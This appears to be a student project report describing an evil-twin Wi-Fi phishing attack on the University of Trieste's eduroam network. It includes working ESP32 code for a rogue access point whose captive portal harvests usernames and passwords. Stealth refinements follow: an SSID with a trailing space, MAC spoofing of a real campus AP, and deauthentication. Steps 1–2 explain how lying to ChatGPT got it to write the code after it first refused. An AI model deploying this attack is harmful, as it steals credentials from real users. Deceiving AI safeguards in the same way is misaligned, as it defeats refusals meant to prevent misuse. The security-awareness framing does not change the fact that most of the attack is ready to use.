# ESP32 EvilTwin attack on UniTS

## Preface
![Photo of Mountain](images/mountain.jpg)

With the rise of LLMs many things changed. One of those things is coding; users that previously didn't know how to code can now use natural language to prompt LLMs to generate relatively complex code. This code more often than not doesn't comply with industry standards in terms of quality/security but it is much better than what someone with basic knowledge in coding could do by himself. (Not to mention the time saved)

This Phenomenon is called **"Vibe coding"**. Someone with a general knowledge in coding or someone that knows how to code in one language only, is now able to use tools like LLMs to write code in many different programming languages but most importantly: a person with basic knowledge about coding is equipped to evaluate and adapt the code generated by LLMs to his requirements. 

This brings us to the goal of this report: A student with general, basic knowledge in coding will (hopefully) demonstrate how chaining the use of **"exploiting" LLMs for malicious purposes** and the **"vulnerabilities" present in people**, could allow adversaries access to public or industry infrastructure with potentialy catastrophic results. 

## Introduction
The basic flow of this project is the following: We will set everything up for an Evil Twin Attack for the University of Trieste but this can be generalized for any institution with "open" networks. I put open under brackets because eduroam is not an open network, as the user is required to authenticate, but we can say it "behaves" as one since people don't inherently think about it as a privte connection and see it as a nice comodity.

We will exploit the fact that users often get random disconnections from eduroam and try to connect manually to eduroam. This is most noticable during class when often professors under the pressure of time try to connect to the eduroam wifi only to give up and choose a wired connection and getting prompted to login while simultaneously blaming the university or eduroam itself for the unneccessary authentication checkup. 
This experience is where this idea came from. Why don't we create a fake wifi access point with the same SSID as eduroam and prompt users that connect to that fake AP to "login to eduroam" while presenting them a login web page that looks trustful. Imput from that page will be saved seprately and could be used by attackers! From personal experience, no one, with the exception of maby professor Bartoli would notice it was an attacker as they would most certainly blame the university or eduroam itself.


This is exactly what we will do in the next steps

## PLAN
The idea is to perform an evil twin attack using a stealthy, cheap and esily disposable device that can gather all the data and be virtually untracable. For this purpose we will use a cheap microcontroller called ESP32 to host the malitcious AP and gather the login data. We will then "exploit" a LLM (in this case ChatGPT) to get a working code and then we will modify it as we see fit, to maximize attack success. To program the ESP32 microcontroller we will use the Arduino IDE (latest version) as it is an easy and effective way to program the ESP32.  

As we are "vibe coding" we need to have a clear idea of what we want to do while also taking into consideration what can be done. This is because we dont want to let the LLM lead the programming flow and thus deviating and messing up the code more than it should (hallucination effect). It works best when we have a clear goal. As stated before we also need to take into consideration what can be done: the ESP32 is a cheap microcontroller and it cannot do complex stuff or host large websites. 

Taking this into consideration we need to:
+ create a code that will make an AP with ssid "eduroam" on the ESP32 device
+ make the code prompt the users to "login to use this network" by a push notification
+ redirect to a login webpage very simmilar to the Units Eventi Wifi login page
+ save the login data onto a separate webpage hosted on the esp32 for easy access
+ give a "connection successful" notice to victim
+ *limit access to the data webpage (only attacker can access)

*this is optional as it doesn't affect the attack in any way.



# PREREQUISITES

+ ESP32 microcontroller
+ Arduino IDE
+ LLM (ChatGPT) 
+ Basic programing knowledge
+ Patience

## Initial SETUP
We need to configure Arduino IDE to work with the ESP32. We can do that by connecting the ESP32 microcontroller with the PC via usb. On the Arduino IDE under "Select board and port" we need to specify the correct port and for the board choose the DOIT ESP32 DEVKIT V1. 
After having thone that we will load a simple example program that will verify that we have set up everything correctly. We can do that by clicking on:

File -> Examples -> 01.Basics -> Blink 

and then cliccknig the Upload button which will compile the code and upload it to the microcontroller. If everything was done right the blue LED on your device should blink every 1000ms (1s).


## STEP 1: Code Generation
After having done the innitial setup we can now proceede with the code generation. For this project I will use ChatGPT but any LLM should suffice. 
This is where we first run into our first problem. As you can see from the image, ChatGPT isn't very keen on writing such a piece of code when asking it directly as it has detected it as potentialy unsafe (as it should). Fortunately for us (unfortunatley for the victims) there is a quick vay of obvieting this: lying

![Direct question](images/NegativeQuestion.png)
![Response](images/ChatgptNegativeResponse.png)

## STEP 2: Lying To The LLM
As we saw in step 1, we cannot ask it directly for the code. This is because the model is censured. We can easily fix this problem by "lying" (in this case telling the truth) to the LLM. 

As it can bee seen from the image the LLM is happy to help now and we can proceed.
The basic idea when approaching a LLM is that you don't want to bury it with details from the start. We want a solid base and only after we will work up to the details. That is why in this prompt we are not asking it to create a specific fake login website and other requirements that would complicate its job.

## STEP 3: First Working Code
Now that we can ask chatgpt to create the code we proceede with many prompts trying to prompt engineere in such a vay that we get a working code. After roughly 60 minutes we get a fully working code:

```cpp
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// AP config
const char* ssid = "eduroam";  // Open network, no password
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

// DNS server
const byte DNS_PORT = 53;
DNSServer dnsServer;

// Web server
WebServer server(80);
String capturedData = "";

// HTML login page (based on UniTS)
const char* loginPage = R"rawliteral(
<!DOCTYPE html>

)rawliteral";

void handleRoot() {
  server.send(200, "text/html", loginPage);
}

void handleLogin() {
  String user = server.arg("username");
  String pass = server.arg("password");

  capturedData += "Username: " + user + " | Password: " + pass + "\n";
  Serial.println("[+] Captured:");
  Serial.println("User: " + user);
  Serial.println("Pass: " + pass);

  server.send(200, "text/html", "<h3>Login successful. You may now browse the internet.</h3>");
}

void handleData() {
  server.send(200, "text/plain", capturedData);
}

void handleNotFound() {
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Start open AP
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid);  // open AP, no password

  Serial.println("[*] Open AP 'eduroam' started");
  Serial.print("[*] IP address: ");
  Serial.println(WiFi.softAPIP());

  // DNS: resolve all domains to ESP IP
  dnsServer.start(DNS_PORT, "*", apIP);

  // Web routes
  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/data", handleData);
  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("[*] Web server started");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}

```

## STEP 4: Modifying The Code
Now that we have a working code it is time to analyze it and modify certain aspects that will make the attack more successful. As you can see our code provides a basic html login page that isn't very convincing, so we will fix that.

Since we are quite happy with the look of the webpage, we will keep the html code, but we need to add the UniTS logo which will make everything nicer. To do that we need to use SPIFFS (Serial Peripheral Interface Flash File System) to upload the files to the microcontroller mamory which will then be available for the code to access when needed.

To do so we need to install Arduino 1.8.19 IDE and download the Arduino ESP32 filesystem uploader plugin from github (```https://github.com/me-no-dev/arduino-esp32fs-plugin```) which will allow to upload the index.html and logo.png files to the microcontroller memory.


![Fake page](images/FinalWebpage.PNG)


## STEP 5: Problem fix
+ After testing, the image on the fake login webpage isn't responsive and it looks bad/fake on certain devices. To fix this we modified the image css code by adding 2 lines of code: 
```cpp
      max-width: 100%;
      height: auto;
```

+ While testing the attack I notied that newer windows 10 versions (22H2) don't prompt the user to login automatically while older windows versions like 19H1 and 19H2 do. After looking it up, the root cause seems to be the NCSI (Network Connectivity Status Indicator) trigger and the fact that it seems that the DNS server address needs to be set to be determined automatically otherwise the redirection doesn't work (at least on windows since if the dns server address is set manually the victim tries to contact always that server and since our evil AP doesn't allow internet connectivity the dns requests cannot get resolved by our dns and the redirect doesn't work). This was fixed by implementing the CaptivePortal example provided by the ESP32 example library directly into our code.

+ When windows recognizes 2 APs with the same ssid they get renamed. That means that our eduroam AP will appear as eduroam 2 on victim's devices if they already used the real eduroam (probably the case). This makes our attack more suspicious so to fix it we will add a character that will make it different from the original eduroam. So from:

  ```cpp
  const char* ssid = "eduroam";  // Evil Twin SSID
  ```
  
  We modify it by adding a space at the end like so:

  ```cpp
  const char* ssid = "eduroam ";  // Evil Twin SSID
  ```
  Making it look different to windows but the same to users.

![Before/After ssid](images/ssid.jpg)
  
## STEP 6: MAC spoofing
Now that we have a fully working rogue AP we can add the ability for the ESP32 to spoof it's MAC address to the MAC address of a real AP in the university. This MAC address can be easily found by using a tool like WifiInfoView by Nirsoft. Spoofing the MAC address that is known to the network enhances the stealth and credibility of the evil twin attack, making it possibly more effective. We do this by adding:

```cpp
  uint8_t customMAC[] = { 0x9C, 0x8C, 0xD8, 0xC9, 0xCA, 0x50 }; // Replace with target MAC
  esp_wifi_set_mac(WIFI_IF_AP, customMAC);
```

after configuring the AP IP settings: 
```cpp  
WiFi.softAPConfig(apIP, apIP, netMsk);
```
and before setting the ssid: 
```cpp
WiFi.softAP(ssid);
```

## STEP 7 (Optional): Deauthenticator
To aid the process of users connecting to our "evil" AP we will try to send deauthentification packets to disconnect the victim from the real acess point thus increasing the probability of getting a victim to acess our "evil" AP. 
As can be easily discovered eduraom uses WPA3 - Enterprise which is a problem since it strictly requires PMF (Protected Management Frames) which we cannot forge as we cannot sign them. But we also know that sometimes eduraom falls back onto older standards like WPA2 - Enterprise for supporting older devices. Since in WPA2 - Enterprise PMF are optional but probably turned on. None the less we can use the tool at ```https://deauther.com``` and an ESP8266 to send deauthentication packets and hopefully boost our success rate.
